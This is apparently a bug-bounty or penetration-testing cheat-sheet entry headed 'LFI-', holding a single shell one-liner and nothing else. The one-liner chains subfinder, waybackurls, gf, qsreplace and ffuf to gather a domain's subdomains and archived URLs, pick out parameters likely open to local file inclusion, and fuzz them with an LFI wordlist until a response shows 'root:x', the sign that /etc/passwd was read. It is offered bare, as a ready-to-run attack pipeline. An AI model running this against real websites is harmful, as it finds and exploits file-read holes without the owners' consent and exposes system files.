# LFI-


subfinder -d example.com -all -q | waybackurls | gf lfi | qsreplace FUZZ | while read url ; do ffuf -u $url -mr “root:x” -w ~/wordlist/LFI.txt ; done
